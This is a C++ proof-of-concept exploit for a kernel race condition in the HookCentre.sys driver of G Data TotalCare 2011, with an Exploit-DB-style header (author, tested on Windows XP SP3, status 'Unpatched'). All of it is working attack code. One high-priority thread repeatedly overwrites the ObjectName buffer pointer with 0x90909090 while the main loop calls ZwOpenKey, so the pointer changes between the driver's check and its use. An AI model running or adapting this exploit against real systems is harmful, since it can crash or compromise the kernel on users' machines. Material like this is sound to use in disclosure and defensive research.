/*

# Exploit Title: G Data TotalCare 2011 NtOpenKey Race Condition Vulnerability

# Date: 2010-11-06 

# Author: Nikita Tarakanov (CISS Research Team)

# Software Link: http://www.gdatasoftware.com/products/trial-versions.html

# Version: up to date, version 21.1.0.5, HookCentre.sys.sys version 10.0.8.11

# Tested on: Win XP SP3

# CVE : CVE-NO-MATCH

# Status : Unpatched

*/



#include <windows.h>

#include <stdio.h>

#include <conio.h>

#include "ntdll.h"

#include "string"



using namespace std;



HANDLE hStartEvent;

HANDLE hStopEvent;

_ZwOpenKey *ZwOpenKey;

bool bStop = false;



DWORD WINAPI Crack(LPVOID Context);





int wmain(int argc, wchar_t *argv[])

{

    ZwOpenKey = (_ZwOpenKey *) GetProcAddress(GetModuleHandle(L"ntdll.dll"), "ZwOpenKey");



    hStartEvent = CreateEvent(NULL, TRUE, FALSE, NULL);

    hStopEvent = CreateEvent(NULL, TRUE, FALSE, NULL);



	OBJECT_ATTRIBUTES oa;

	wchar_t wcKeyName[] = L"\\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\DrWatson";

	UNICODE_STRING KeyName = { 

			sizeof wcKeyName - sizeof wcKeyName[0],

			sizeof wcKeyName,

			wcKeyName

			};



	DWORD ptr = (DWORD)KeyName.Buffer;



	InitializeObjectAttributes(&oa, &KeyName, OBJ_CASE_INSENSITIVE, NULL, NULL);



	DWORD ThreadId;

	HANDLE hThread = CreateThread(NULL, 0, Crack, &oa, 0, &ThreadId);



	while ( !_kbhit() ) {

		HANDLE hKey;

		oa.ObjectName->Buffer = (PWSTR)ptr;

		NTSTATUS rc = ZwOpenKey(&hKey, STANDARD_RIGHTS_READ, &oa);

		if ( !NT_SUCCESS(rc) )

			printf("Error: %x\n", rc);

		else {

			CloseHandle(hKey);

		}

	}



	SetEvent(hStopEvent);

	WaitForSingleObject(hThread, INFINITE);

   

    return 0;

}



DWORD WINAPI Crack(LPVOID Context)

{

	POBJECT_ATTRIBUTES oa = (POBJECT_ATTRIBUTES) Context;



	DWORD *ptr = (DWORD*)&oa->ObjectName->Buffer;



	SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_HIGHEST);

	SetEvent(hStartEvent);



	while ( true ) {

		*ptr = 0x90909090;

		if ( WaitForSingleObject(hStopEvent, 1) == WAIT_OBJECT_0 ) break;

	}





    return 0;

}

